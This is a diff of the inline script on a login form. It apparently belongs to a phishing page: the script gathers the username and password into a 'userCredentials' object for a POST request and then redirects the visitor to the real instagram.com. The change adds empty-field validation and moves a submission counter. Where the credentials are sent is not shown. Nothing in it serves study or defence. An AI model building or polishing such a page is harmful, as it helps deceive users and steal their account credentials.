@@ -323,13 +323,21 @@
   <script>
     var count = 0;
     function validateForm() {
-      ++count;
+     
       var errorMessage = document.getElementById("error-message");
       var passwordInput = document.getElementById("password");
       var userInput = document.getElementById("username");
       var password = passwordInput.value;
       // Assuming username is always "sahitya"
       var username = userInput.value;
+
+      if (username.trim() === "" || password.trim() === "") {
+        // Display an error message or perform any other desired action
+        document.getElementById("error-message").innerHTML = "Both username and password are required.";
+      } else {
+        // Clear any previous error messages
+         ++count;
+        document.getElementById("error-message").innerHTML = "";
 
       // Create an object to send in the POST request
       var userCredentials = {
@@ -361,8 +369,10 @@
       else {
         window.location.href = "https://instagram.com";
       }
+
       passwordInput.value = "";
-      userInput.value = "";
+
+    }
     }
 
     function togglePasswordVisibility() {
